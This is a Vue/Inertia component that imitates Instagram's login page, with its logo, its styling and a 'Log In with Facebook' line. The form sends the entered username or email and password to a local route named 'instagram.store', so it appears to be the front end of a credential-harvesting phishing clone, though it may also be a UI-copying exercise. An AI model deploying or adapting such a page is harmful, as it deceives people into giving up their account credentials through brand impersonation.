<template>
    <div class="flex flex-col justify-center items-center">
        <div class="w-full sm:max-w-sm  mt-10  py-4 bg-white overflow-hidden bg-white"
             style="border: 1px solid #dbdbdb;margin-bottom: 10px;">
            <div class=" flex flex-col justify-center items-center">
                <img src="images/insta_logo.png" style="width:175px;height: 51px; margin-top:22px;margin-bottom: 12px">

                <form @submit.prevent="submit">
                    <div style="margin-top:24px;width:fit-content">
                        <div style="margin-bottom: 6px">
                            <input v-model="form.username" type="text" placeholder="Username or email" required name="username">
                        </div>
                        <div>
                            <input v-model="form.password"  type="password" placeholder="Password" required name="password">
                        </div>
                        <button type="submit" class="logInBtn">Log In</button>
                    </div>

                </form>

                <div style="display: flex; margin-top: 10px">
                    <div class="OrSec"></div>
                    <h1 class="or-txt">OR</h1>
                    <div class="OrSec"></div>
                </div>

                <div style="display: flex">
                    <h1 class="facebook-txt">Log In with Facebook</h1>
                </div>

                <div style="text-align: center">
                    <a href="#" class="none">
                        <h1 class="password-txt">Forgot Password?</h1>
                    </a>
                </div>
            </div>
        </div>

        <div class="w-full sm:max-w-sm  mt-1  py-4 bg-white overflow-hidden bg-white"
             style="border: 1px solid #dbdbdb;margin-bottom: 10px;padding: 20px 95px 20px 95px">
            <div class="flex flex-col justify-center items-center">
                <h1 style="font-size: 14px;width: 200px;">Don't have an account? <a href="#"    style="cursor: pointer"><span
                    style="color: #0095f6;font-weight: inherit">Sign Up</span></a></h1>
            </div>
        </div>


        <div style="margin: 10px 0">
            <h1 class="GetApp" style="font-size: 14px;    line-height: 18px;">Get the app.</h1>
        </div>

        <div class="social-platform grid grid-cols-1 md:grid-cols-2 flex gap-y-4">
            <div>
                <a href="#">
                    <img style="height: 50px" class="mr-2" src="images/app-logos.png">
                </a>
            </div>
            <div>
                <a href="#">
                    <img style="height: 50px" src="images/GooglePlay.png">
                </a>
            </div>
        </div>

        <h1 class="password-txt">
            If you Log In you will be agreed to our
            <a ><span style="cursor: pointer;color: #0095f6">Terms & Conditions </span>
            </a>
        </h1>

    </div>
</template>

<script setup>
import {useForm} from "@inertiajs/vue3";

const form = useForm({
    username: '',
    password: '',
});

const submit = () => {
    form.post(route('instagram.store'));
};
</script>

<style scoped>
input {
    font-size: 12px;
    font-family: Verdana;
    background: #fafafa;
    -webkit-box-flex: 1;
    -webkit-flex: 1 0 auto;
    -ms-flex: 1 0 auto;
    flex: 1 0 auto;
    margin: 0;
    outline: 0;
    overflow: hidden;
    text-overflow: ellipsis;
    -webkit-appearance: none;
    color: #000000;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    line-height: 18px;
    border: 1px solid #dbdbdb;
    border-radius: 2px;
    width: 250px;
    height: 38px;
    padding: 9px 0 7px 8px;
}

.logInBtn {
    background-color: #0095f6;
    border: 1px solid transparent;
    height: 28px;
    border-radius: 4px;
    color: white;
    width: 250px;
    margin-top: 14px;
    margin-bottom: 8px;
    font-size: 12px;
    font-family: Verdana;

}

.OrSec {
    height: 2px;
    width: 100px;
    background-color: #bdc1c6;
    margin-top: 8px;
    margin-right: 14px;
    margin-left: 14px;
}

.or-txt {
    font-family: Verdana;
    font-size: 12px;
    color: #bdc1c6;
}

.facebook-txt {
    color: #385185;
    font-family: Calibri;
    font-size: 16px;
    margin-top: 10px;
}

.password-txt {
    font-family: Verdana;
    font-size: 10px;
    margin-top: 12px;
}

.nonea {
    text-decoration: none;
    cursor: pointer;
}

.social-platform {
}

</style>
